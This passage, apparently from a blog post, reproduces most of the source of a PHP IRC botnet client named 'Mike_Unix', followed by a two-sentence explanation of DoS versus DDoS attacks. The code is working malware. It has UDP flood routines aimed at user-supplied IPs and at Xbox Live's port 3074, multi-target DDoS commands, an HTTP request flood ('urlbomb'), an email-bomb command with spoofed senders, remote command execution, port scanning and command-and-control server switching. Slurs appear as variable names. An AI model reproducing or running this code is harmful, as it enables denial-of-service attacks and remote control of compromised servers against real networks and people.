                                                $version = $this->config['version'];
                                                $cmdz = "Command List for UniX version $version private:";
                                                $this->privmsg( $this->ffff_you( ),"$leetprefixwhite$red $cmdz $leetsuffixwhite");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."UDP-Flood".$blue."] ? ? ? ".$red.".udpflood ip packetsize time".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Xbox Live Flood".$blue."] ? ? ? ".$red.".xblflood ip packetsize time port".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Two BK Flood".$blue."] ? ? ? ".$red.".2kidz first.ip second.ip".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Three BK Flood".$blue."] ? ? ? ".$red.".3kidz first.ip second.ip third.ip".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Four BK Flood".$blue."] ? ? ? ".$red.".4kidz first.ip second.ip third.ip fourth.ip".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Cell RapE".$blue."] ? ? ? ".$red.".cellhelp".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Cell Phone Carriers".$blue."] ? ? ? ".$red.".carriers".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Evidence Eraser".$blue."] ? ? ? ".$red.".noevidence".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Hop".$blue."] ? ? ? ".$red.".hop #channel".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Exec".$blue."] ? ? ? ".$red.".exec unix command(s)".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."eMail RapE".$blue."] ? ? ? ".$red.".bomb victim@fbi.gov spoofed@fake.com Subject NumberOfMails EmailBody".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Count".$blue."] ? ? ? ".$red.".count".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Nick".$blue."] ? ? ? ".$red.".nick (nzm or unix)".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Credits".$blue."] ? ? ? ".$red.".credits".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Version".$blue."] ? ? ? ".$red.".v or !ver or !version".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Bot Ip".$blue."] ? ? ? ".$red.".ip".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."MD5 Encrypt".$blue."] ? ? ? ".$red.".md5 string_to_encrypt".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."DnS".$blue."] ? ? ? ".$red.".dns google.com".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Kill Bot".$blue."] ? ? ? ".$red.".exit or !gtfo".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Reconnect".$blue."] ? ? ? ".$red.".restart".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Whois".$blue."] ? ? ? ".$red.".whois 127.0.0.1".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Raw Irc Commands".$blue."] ? ? ? ".$red.".join, .part, .msg".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Port Scan".$blue."] ? ? ? ".$red.".pscan ip port".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Infected Site Check".$blue."] ? ? ? ".$red.".site".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Random Nick".$blue."] ? ? ? ".$red.".randnick".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."URL Bomb".$blue."] ? ? ? ".$red.".urlbomb site.com /path NumberOfRefreshes".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Server Uptime".$blue."] ? ? ? ".$red.".uptime".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Speed Test".$blue."] ? ? ? ".$red.".speedtest".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Quick UDP-Flood".$blue."] ? ? ? ".$red.".quick ip".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Check Last Login".$blue."] ? ? ? ".$red.".lastlogin".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Raw Irc Command".$blue."] ? ? ? ".$red.".raw command".$blue." ? ? ?");
                                                $this->privmsg( $this->ffff_you( ),"$blue [".$red."Change Command Prefix".$blue."] ? ? ? ".$red.".changeprefix newprefix Example: .changeprefix !".$blue." ? ? ?");
                                                break;
                                            }
                                            case "md5":
                                            {
                                                        $leetprefix = $this->config['leetprefix'];
                                                        $leetsuffixred = $this->config['leetsuffixred'];
                                                        $red = $this->config['yellow'];
                                                        $blue = $this->config['blue'];
                                                $str_md5 = substr( strstr( $msg, $mcmd[0] ), strlen( $mcmd[0] ) + 1 );
                                                $this->privmsg( $this->ffff_you( ), "$blue [ $red MD5 $blue ]: $blue [ ".$red."'".$str_md5."' ".$blue."Encrypts To $red'".md5($str_md5)."' $blue ]" );
                                                break;
                                            }
                                            case "dns":
                                            {
                                                if(isset($mcmd[1]))
                                                   {
                                                      $ip = explode(".",$mcmd[1]);
                                                      if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1])
                                                        && is_numeric($ip[2]) && is_numeric($ip[3]))
                                                      {
                                                        $leetprefix = $this->config['leetprefix'];
                                                        $leetsuffixred = $this->config['leetsuffixred'];
                                                        $red = $this->config['yellow'];
                                                        $blue = $this->config['blue'];
                                                         $this->privmsg($this->ffff_you( ),"$leetprefix $blue [ $red DnS $blue ]: $red ".$mcmd[1]." $blue Resolves To $leetprefix $red ".gethostbyaddr($mcmd[1]));
                                                          }
                                                      else
                                                      {
                                                        $leetprefix = $this->config['leetprefix'];
                                                        $leetsuffixred = $this->config['leetsuffixred'];
                                                        $red = $this->config['yellow'];
                                                        $blue = $this->config['blue'];
                            $this->privmsg($this->ffff_you( ),"$blue [ $red DnS $blue ]: $red ".$mcmd[1]." $blue Resolves To $red ".gethostbyname($mcmd[1]));
                                                      }
                                                   }
                                                break;
                                            }
                                            case "exit":
                                            {
                                                fclose( $this->conn );
                                                exit( );
                                                break;
                                            }
                                            case "husk":
                                            {
                                                fclose( $this->conn );
                                                exit( );
                                                break;
                                            }
                                            case "gtfo":
                                            {
                                                fclose( $this->conn );
                                                exit( );
                                                break;
                                            }
                                            case "restart":
                                            {
                                                $leetprefixwhite = $this->config['leetprefixwhite'];
                                                $leetsuffixwhite = $this->config['leetsuffixwhite'];
                                                $red = $this->config['yellow'];
                                                $blue = $this->config['blue'];
                                                $this->privmsg( $this->ffff_you( ), "$leetprefixwhite $red Restarting! $leetsuffixwhite $blue Please wait!" );
                                                $this->send( "QUIT :restart command from ".$nick );
                                                fclose( $this->conn );
                                                $this->start();
                                                break;
                                            }
                                            case "lastresort":
                                            {
                                                if( count( $mcmd ) > 3 )
                                                {
                                                    $server = $mcmd[1];
                                                    $port = $mcmd[2];
                                                    $channel = $mcmd[3];
                                                    $key = $mcmd[4];
                                                    if( $this->using_encode )
                                                    {
                                                        $this->config[ 'server' ] = base64_encode( $server );
                                                        $this->config[ 'chan' ] = base64_encode( str_replace( "#", "", $channel ) );
                                                        $this->config[ 'key' ] = base64_encode( $key );
                                                    }
                                                    else
                                                    {
                                                        $this->config[ 'server' ] = $server;
                                                        $this->config[ 'chan' ] = str_replace( "#", "", $channel );
                                                        $this->config[ 'key' ] = $key;
                                                    }
                                                    $this->config[ 'port' ] = $port;
                                                    $this->privmsg( $this->ffff_you( ), "[ moveserver ] ".$server." => ".$port." => ".$channel." => ".$key );
                                                    $this->send( "QUIT :moveserver command from ".$nick );
                                                    fclose( $this->conn );
                                                    $this->start();
                                                }
                                                break;
                                            }
                                            case "whois":
                                            {
                                                $param2 = $mcmd[1];
                                                if( !empty( $param2 ) )
                                                {
                                                    //do it
                                                    //http://www.geoip.co.uk/?IP=98.214.115.193&submit.x=23&submit.y=11
                                                    $fp = fsockopen( "geoip.co.uk", 80, $errno, $errstr, 30 );
                                                    if( $fp )
                                                    {
                                                        $out = "GET /ipwhois.php?ip=$param2&Submit=submit HTTP/1.1\r\n";
                                                        $out .= "Host: geoip.co.uk\r\n";
                                                        $out .= "Keep-Alive: 300\r\n";
                                                        $out .= "Connection: keep-alive\r\n\r\n";
                                                        fwrite( $fp, $out );
                                                        $whodata = '';
                                                        while(!feof($fp))
                                                        {
                                                            /*do nothing*/
                                                            $whodata .= fread( $fp, 1024 );
                                                        }
                                                        $countryc = explode( "            :", $whodata );
                                                        $countryc = explode( "            : <img src=", $countryc[1] );
                                                        $country = strip_tags( $countryc[0] );
                                                        $statec = explode( "$countryc", $whodata );
                                                        $statec = explode( "                        <br>", $statec[1] );
                                                        $state = strip_tags( $statec[0] );
                                                        $cityc = explode( "$statec", $whodata );
                                                        $cityc = explode( "            : <img src=", $cityc[1] );
                                                        $city = strip_tags( $cityc[0] );
                                                        fclose( $fp );
                                                        $leetprefixwhite = $this->config['leetprefixwhite'];
                                                                                                                $leetsuffixwhite = $this->config['leetsuffixwhite'];
                                                                                                                $red = $this->config['yellow'];
                                                                                                                $blue = $this->config['blue'];
                                                        $this->privmsg( $this->ffff_you( ), "$leetprefixwhite $red $param2 $leetsuffixwhite - $red Country - $blue $country" );
                                                        $this->privmsg( $this->ffff_you( ), "$leetprefixwhite $red $param2 $leetsuffixwhite - $red City - $blue $city" );
                                                        $this->privmsg( $this->ffff_you( ), "$leetprefixwhite $red $param2 $leetsuffixwhite - $red State - $blue $state" );
                                                    }else{
                                                        $this->privmsg( $this->ffff_you( ), "[ whois ] Error: $errstr" );
                                                    }
                                                }
                                                else
                                                {
                                                    $this->privmsg( $this->ffff_you( ), "[ whois ] Invalid params, use .whois <ip/host>" );
                                                }
                                                break;
                                            }
                                            case "join":
                                            {
                                                $channel = $mcmd[1];
                                                $key = $mcmd[2];
                                                $this->join( $channel, $key );
                                                break;
                                            }
                                            case "part":
                                            {
                                                $this->send( "PART ".$mcmd[1] );
                                            }
                                            case "msg":
                                            {
                                                $person = $mcmd[1];
                                                $text = substr( strstr( $msg, $mcmd[1] ), strlen( $mcmd[1] ) + 1 );
                                                $this->privmsg( $person, $text );
                                                break;
                                            }
                                            case "pscan":
                                                      $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $blue = $this->config['blue'];
                               if(count($mcmd) > 2)
                               {
                                  if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15))
                                     $this->privmsg($this->ffff_you( ),"$leetprefix $blue Port Scan $leetsuffixred : $red ".$mcmd[1].":".$mcmd[2]." $blue is OPEN !");
                                  else
                                     $this->privmsg($this->ffff_you( ),"$leetprefix $blue Port Scan $leetsuffixred : $blue ".$mcmd[1].":".$mcmd[2]." $red is CLOSED !");
                                      break;
                               }
                                            case "software":
                                            {
                                                $this->privmsg( $this->ffff_you( ), $_SERVER[ 'SERVER_SOFTWARE' ] );
                                                break;
                                            }
                                            case "site123":
                                            {
                                                $leetprefixwhite = $this->config['leetprefixwhite'];
                                                $leetsuffixwhite = $this->config['leetsuffixwhite'];
                                                $red = $this->config['yellow'];
                                                $blue = $this->config['blue'];
                                                $ipzzz = ( $_SERVER["HTTP_HOST"] );
                                                $this->privmsg( $this->ffff_you( ), "$blue This bot is running on $leetprefixwhite $red $ipzzz $leetsuffixwhite" );
                                                break;
                                            }
                                            case "randnick":
                                            {
                                                $this->set_nick();
                                                break;
                                            }
                                            case "logout":
                                            {
                                                $logoutmsg = $this->messages['logoutmsg'];
                                                $leetprefixwhite = $this->config['leetprefixwhite'];
                                                $leetsuffixwhite = $this->config['leetsuffixwhite'];
                                                $red = $this->config['yellow'];
                                                $part2 = $this->config['part2'];
                                                $this->remove_auth( $host );
                                                $this->privmsg( $this->ffff_you( ), "$logoutmsg $leetprefixwhite $red$nick $leetsuffixwhite $part2" );
                                                break;
                                            }
                                            case "urlbomb":
                                            {
                                                $this->urlbomb( $mcmd[ 1 ], $mcmd[ 2 ], $mcmd[ 3 ] );
                                                break;
                                            }
                                            case "udpflood":
                                                {
                                                   if( count( $mcmd ) > 3 )
                                                   {
                                                      $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]);
                                                   }
                                                }
                                            case "stop":
                                            {
                                            fclose($fp);
                                            break;
                                            }
                                            case "xblflood":
                                            {
                                                   if( count( $mcmd ) > 4 )
                                                   {;
                                                      $this->udpflood4($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4]);
                                                   }
                                                break;
                                            }
                                            case "speedtest":
                                            {
                                                      $this->udpflood3(hi,650000,5);
                                                break;
                                            }
                                            case "2kidz":
                                            {
                                                      $this->udpflood5($mcmd[1],$mcmd[2]);
                                                break;
                                            }
                                            case "3kidz":
                                            {
                                                      $this->udpflood7($mcmd[1],$mcmd[2],$mcmd[3]);
                                                break;
                                            }
                                            case "4kidz":
                                            {
                                                      $this->udpflood6($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4]);
                                                break;
                                            }
                                                    case "quick":
                                            {
                                                   if( count( $mcmd ) > 1 )
                                                   {
                                                      $this->udpflood2($mcmd[1],65000,60);
                                                   }
                                                break;
                                                }
                                        }
                                    }
                                }
                            break;
                        }
                    }
                }
                $old_buf = $this->buf;
            }
            $this->start();
        }
        function scanport( $host, $port )
        {
            if( fsockopen( $host, $port, $e, $s ) )
            {
                return 1;
            }
            return 0;
        }
        function urlbomb( $host, $path, $times, $mode = 0 )
        {
            if( !isset( $host ) || !isset( $path ) || !isset( $times ) )
                return;
            $leetprefixwhite = $this->config['leetprefixwhite'];
            $leetsuffixwhite = $this->config['leetsuffixwhite'];
            $leetprefix = $this->config['leetprefix'];
            $leetsuffixred = $this->config['leetsuffixred'];
            $red = $this->config['yellow'];
            $blue = $this->config['blue'];
            $http = "http://";
            $this->privmsg( $this->ffff_you( ),"$leetprefixwhite $red URLbomb started! $leetsuffixwhite  on $red [ $blue ".$http."".$host."".$path." $red ]");
            $success = 0;
            for( $i = 0; $i < $times; $i++ )
            {
                $fp = fsockopen( $host, 80, $errno, $errstr, 30 );
                if( $fp )
                {
                    $out = "GET /".$path." HTTP/1.1\r\n";
                    $out .= "Host: ".$host."\r\n";
                    $out .= "Keep-Alive: 300\r\n";
                    $out .= "Connection: keep-alive\r\n\r\n";
                    fwrite( $fp, $out );
                    if( $mode != 0 )
                    {
                        while(!feof($fp)){/*do nothing*/}
                    }
                    fclose( $fp );
                    $success++;
                }
            }
            $leetprefixwhite = $this->config['leetprefixwhite'];
            $leetsuffixwhite = $this->config['leetsuffixwhite'];
            $leetprefix = $this->config['leetprefix'];
            $leetsuffixred = $this->config['leetsuffixred'];
            $red = $this->config['yellow'];
            $blue = $this->config['blue'];
            $http = "http://";
            $this->privmsg( $this->ffff_you( ),"$leetprefixwhite $red URLbomb finished! $leetsuffixwhite $blue on $red [ $blue ".$http."".$host."".$path." $red ] $blue [$red Times Visited: $blue ".$success." $blue ]" );
        }
        function udpflood2( $host, $packetsize, $time )
        {
            $udpmsgfast = $this->messages['udpmsgfast'];
            $leetprefixwhite = $this->config['leetprefixwhite'];
            $leetsuffixwhite = $this->config['leetsuffixwhite'];
            $red = $this->config['yellow'];
            $blue = $this->config['yellow'];
            $this->privmsg( $this->ffff_you( ),"$udpmsgfast Started On $leetprefixwhite$red $host $leetsuffixwhite" );
            $packet = "";
            for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
            $timei = time();
            $i = 0;
            while(time()-$timei < $time)
            {
                $xboxlive = "3074";
                $fp=fsockopen("udp://".$host,$xboxlive,$e,$s,5);
                fwrite($fp,$packet);
                fclose($fp);
                $i++;
            }
            $env = $i * $packetsize;
            $env = $env / 1048576;
            $vel = $env / $time;
            $vel = round($vel);
            $env = round($env);
            $fag = "$udpmsgfast - Sent Total $leetprefixwhite$red $env Megabytes $leetsuffixwhite$red With A Speed Of $leetprefixwhite$red $vel MegaBytes/Second $leetsuffixwhite";
            $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
            $this->ex('echo 1 >> cache.dat');
        }
    function udpflood3( $host, $packetsize, $time )
        {
            $leetprefixwhite = $this->config['leetprefixwhite'];
            $speedtest = $this->messages['speedtest'];
            $speedtestfin = $this->messages['speedtestfin'];
            $leetsuffixwhite = $this->config['leetsuffixwhite'];
            $red = $this->config['yellow'];
            $blue = $this->config['yellow'];
            $green = $this->config['green'];
            $part1 = $this->config['part1'];
            $part2 = $this->config['part2'];
            $this->privmsg( $this->ffff_you( ),"$part1$red The Speedtest Has been Started.... $part2 - $blue Please Wait......" );
            $packet = "";
            for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
            $timei = time();
            $i = 0;
            while(time()-$timei < $time)
            {
                $xboxlive = "3074";
                $fp=fsockopen("udp://".$host,$xboxlive,$e,$s,5);
                fwrite($fp,$packet);
                fclose($fp);
                $i++;
            }
            $env = $i * $packetsize;
            $env = $env / 1048576;
            $vel = $env / $time;
            $vel = round($vel);
            $env = round($env);
            $red = $this->config['yellow'];
            $part1 = $this->config['part1'];
            $part2 = $this->config['part2'];
            $blue = $this->config['yellow'];
            $fag = "$part1$red The Speedtest Is Complete. $part2 - $blue This Bot Hits At".$red." $vel MegaBytes/Second";
            $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
            $this->ex('echo 1 >> cache.dat');
        }
    function udpflood5( $host, $crack )
        {
            $packetsize = "65000";
            $time = "60";
            $port = "3074";
            $leetprefixwhite = $this->config['leetprefixwhite'];
            $speedtest = $this->messages['speedtest'];
            $speedtestfin = $this->messages['speedtestfin'];
            $leetsuffixwhite = $this->config['leetsuffixwhite'];
            $red = $this->config['yellow'];
            $blue = $this->config['yellow'];
            $green = $this->config['green'];
            $part1 = $this->config['part1'];
            $part2 = $this->config['part2'];
            $this->privmsg( $this->ffff_you( ),"$part1$red TwO PlayeR DDoS $part2 - $blue Booting $host and $crack! Attacking on port $port" );
            $packet = "";
            for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
            $timei = time();
            $i = 0;
            while(time()-$timei < $time)
            {
                $port = "3074";
                $fp=fsockopen("udp://".$host,$port,$e,$s,5);
                $fp2=fsockopen("udp://".$crack,$port,$e,$s,5);
                fwrite($fp,$packet);
                fwrite($fp2,$packet);
                fclose($fp);
                fclose($fp2);
                $i++;
            }
            $env = $i * $packetsize;
            $env = $env / 1048576;
            $vel = $env / $time;
            $vel = round($vel);
            $env = round($env);
            $red = $this->config['yellow'];
            $part1 = $this->config['part1'];
            $part2 = $this->config['part2'];
            $blue = $this->config['yellow'];
            $fag = "$part1$red TwO PlayeR DDoS! $part2 - $blue $host and $crack are offline! ".$red." $vel MegaBytes/Second";
            $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
            $this->ex('echo 1 >> cache.dat');
        }
    function udpflood6( $host, $crack, $herion, $coke )
        {
            $packetsize = "65000";
            $time = "60";
            $port = "3074";
            $leetprefixwhite = $this->config['leetprefixwhite'];
            $speedtest = $this->messages['speedtest'];
            $speedtestfin = $this->messages['speedtestfin'];
            $leetsuffixwhite = $this->config['leetsuffixwhite'];
            $red = $this->config['yellow'];
            $blue = $this->config['yellow'];
            $green = $this->config['green'];
            $part1 = $this->config['part1'];
            $part2 = $this->config['part2'];
            $this->privmsg( $this->ffff_you( ),"$part1$red 4 Player DDoS! $part2 - $blue Booting $host, $crack, $herion, and $coke! Attacking on port $port" );
            $packet = "";
            for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
            $timei = time();
            $i = 0;
            while(time()-$timei < $time)
            {
                $port = "3074";
                $fp=fsockopen("udp://".$host,$port,$e,$s,5);
                $fp2=fsockopen("udp://".$crack,$port,$e,$s,5);
                $fp3=fsockopen("udp://".$herion,$port,$e,$s,5);
                $fp4=fsockopen("udp://".$coke,$port,$e,$s,5);
                fwrite($fp,$packet);
                fwrite($fp2,$packet);
                fwrite($fp3,$packet);
                fwrite($fp4,$packet);
                fclose($fp);
                fclose($fp2);
                fclose($fp3);
                fclose($fp4);
                $i++;
            }
            $env = $i * $packetsize;
            $env = $env / 1048576;
            $vel = $env / $time;
            $vel = round($vel);
            $env = round($env);
            $red = $this->config['yellow'];
            $part1 = $this->config['part1'];
            $part2 = $this->config['part2'];
            $blue = $this->config['yellow'];
            $fag = "$part1$red 4 Player DDoS CompletE! $part2 - $blue $host, $crack, $herion, and $coke are ALL offline! ".$red." $vel MegaBytes/Second";
            $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
            $this->ex('echo 1 >> cache.dat');
        }
    function udpflood7( $stoner, $allalone, $daynnite )
        {
            $packetsize = "65000";
            $time = "60";
            $port = "3074";
            $leetprefixwhite = $this->config['leetprefixwhite'];
            $speedtest = $this->messages['speedtest'];
            $speedtestfin = $this->messages['speedtestfin'];
            $leetsuffixwhite = $this->config['leetsuffixwhite'];
            $red = $this->config['yellow'];
            $blue = $this->config['yellow'];
            $green = $this->config['green'];
            $part1 = $this->config['part1'];
            $part2 = $this->config['part2'];
            $this->privmsg( $this->ffff_you( ),"$part1$red 3 Player DDoS! $part2 - $blue Booting $stoner, $allalone, and $daynnite! Attacking on port $port" );
            $packet = "";
            for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
            $timei = time();
            $i = 0;
            while(time()-$timei < $time)
            {
                $port = "3074";
                $fp2=fsockopen("udp://".$stoner,$port,$e,$s,5);
                $fp3=fsockopen("udp://".$allalone,$port,$e,$s,5);
                $fp4=fsockopen("udp://".$daynnite,$port,$e,$s,5);
                fwrite($fp2,$packet);
                fwrite($fp3,$packet);
                fwrite($fp4,$packet);
                fclose($fp2);
                fclose($fp3);
                fclose($fp4);
                $i++;
            }
            $env = $i * $packetsize;
            $env = $env / 1048576;
            $vel = $env / $time;
            $vel = round($vel);
            $env = round($env);
            $red = $this->config['yellow'];
            $part1 = $this->config['part1'];
            $part2 = $this->config['part2'];
            $blue = $this->config['yellow'];
            $fag = "$part1$red 3 Player DDoS CompletE! $part2 - $blue $stoner, $allalone, and $daynnite are now offline offline! ".$red." $vel MegaBytes/Second";
            $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
            $this->ex('echo 1 >> cache.dat');
        }
        function udpflood( $host, $packetsize, $time )
        {
            $udpmsg = $this->messages['udpmsg'];
            $leetprefixwhite = $this->config['leetprefixwhite'];
            $leetsuffixwhite = $this->config['leetsuffixwhite'];
            $red = $this->config['yellow'];
            $blue = $this->config['yellow'];
            $this->privmsg( $this->ffff_you( ),"$udpmsg Started On $leetprefixwhite$red $host $leetsuffixwhite for $leetprefixwhite$red $time Seconds $leetsuffixwhite$red With $leetprefixwhite$red $packetsize Packets $leetsuffixwhite" );
            $packet = "";
            for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
            $timei = time();
            $i = 0;
            while(time()-$timei < $time)
            {
                $fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
                fwrite($fp,$packet);
                fclose($fp);
                $i++;
            }
            $env = $i * $packetsize;
            $env = $env / 1048576;
            $vel = $env / $time;
            $vel = round($vel);
            $env = round($env);
            $fag = "$udpmsg - Sent Total $leetprefixwhite$red $env Megabytes $leetsuffixwhite$red With A Speed Of $leetprefixwhite$red $vel MegaBytes/Second $leetsuffixwhite";
            $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
            $this->ex('echo 1 >> cache.dat');
        }
        function udpflood4( $host, $packetsize, $time, $port )
        {
            $udpmsg = $this->messages['udpmsg'];
            $leetprefixwhite = $this->config['leetprefixwhite'];
            $leetsuffixwhite = $this->config['leetsuffixwhite'];
            $red = $this->config['yellow'];
            $blue = $this->config['yellow'];
            $this->privmsg( $this->ffff_you( ),"$udpmsg Started On $leetprefixwhite$red $host $leetsuffixwhite for $leetprefixwhite$red $time Seconds $leetsuffixwhite$red With $leetprefixwhite$red $packetsize Packets $leetsuffixwhite$red On port $leetprefixwhite$red $port $leetsuffixwhite" );
            $packet = "";
            for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
            $timei = time();
            $i = 0;
            while(time()-$timei < $time)
            {
                $fp=fsockopen("udp://".$host,$port,$e,$s,5);
                fwrite($fp,$packet);
                fclose($fp);
                $i++;
            }
            $env = $i * $packetsize;
            $env = $env / 1048576;
            $vel = $env / $time;
            $vel = round($vel);
            $env = round($env);
            $fag = "$udpmsg - Sent Total $leetprefixwhite$red $env Megabytes $leetsuffixwhite$red With A Speed Of $leetprefixwhite$red $vel MegaBytes/Second $leetsuffixwhite On Port $leetprefixwhite$red $port $leetsuffixwhite";
            $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
            $this->ex('echo 1 >> cache.dat');
        }
        function send($msg)
        {
            fwrite($this->conn,"$msg\r\n");
        }
        function join($chan,$key=NULL)
        {
            $this->send("JOIN $chan $key");
        }
        function privmsg($to,$msg)
        {
            $this->send("PRIVMSG $to :$msg");
        }
        function notice($to,$msg)
        {
            $this->send("NOTICE $to :$msg");
        }
         function set_nick()
         {
            $prefix .= "[RFI|";
            $random_number = "";
            for( $i = 0; $i < $this->config[ 'maxrand' ]; $i++ )
            {
                $random_number .= mt_rand( 0, 9 );
            }
            $this->nick = sprintf( $prefix.$this->config[ 'nickform' ], $random_number );
            $this->send("NICK ".$this->nick);
         }
         function busk_nick()
         {
            $prefix .= "[RooT|LinuX|";
            $random_number = "";
            for( $i = 0; $i < $this->config[ 'maxrand' ]; $i++ )
            {
                $random_number .= mt_rand( 0, 9 );
            }
            $this->nick = sprintf( $prefix.$this->config[ 'nickform2' ], $random_number );
            $this->send("NICK ".$this->nick);
         }
         function nzm_nick()
         {
            $prefix .= "[USA|";
            $random_number = "";
            for( $i = 0; $i < $this->config[ 'maxrand' ]; $i++ )
            {
                $random_number .= mt_rand( 0, 9 );
            }
            $ffffu = "$this->config[ 'prfix' ]";
            $this->nick = sprintf( $prefix.$this->config['prfix'], $random_number );
            $this->send("NICK ".$this->nick);
         }
        function parse_url_s( $url )
        {
            $URLpcs = ( parse_url( $url ) );
            $PathPcs = explode( "/", $URLpcs['path'] );
            $URLpcs['file'] = end( $PathPcs );
            unset( $PathPcs[ key( $PathPcs ) ] );
            $URLpcs['dir'] = implode("/",$PathPcs);
            $fileext = explode( '.', $URLpcs['file'] );
            if(count($fileext))
            {
                $URLpcs['file_ext'] = $fileext[ count( $fileext ) - 1 ];
            }
            return ($URLpcs);
        }
    }
    $bot = new Mike_Unix;
    $bot->start();
?>
{% endhighlight %}

A DoS attack is made by only one person (or computer), while a DDoS attack is made by two or more.  
Generally a denial of service attack involves sending many &#8211; essentially meaningless &#8211; requests to a server, so the server cannot respond to legitimate queries, either within a reasonable timeframe, or even not at all.

 [1]: http://en.wikipedia.org/wiki/Denial-of-service_attack "DDoS"